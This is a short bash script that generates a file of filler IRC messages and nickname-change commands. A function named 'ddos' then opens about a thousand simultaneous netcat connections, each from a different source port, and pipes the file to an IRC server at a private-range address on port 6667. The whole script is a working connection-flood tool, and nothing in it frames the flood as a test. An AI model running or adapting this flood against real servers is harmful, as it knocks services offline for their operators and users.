#!/bin/bash

function GenText
{
  for line in {0..100}
  do
    echo "some message $line" >> message_file.txt
    lineId=$(( $line%5 ))
    if [ "$lineId" -eq 0 ]
    then
      echo "\\nickname nowIam$line" >> message_file.txt
    fi
  done
}

function ddos
{
  for port in {15000..15999}
  do
    echo "Using port nr $port"
    cat ./message_file.txt | nc -p $port 192.168.253.131 6667 &
  done
}

rm -rf ./message_file.txt
GenText
ddos

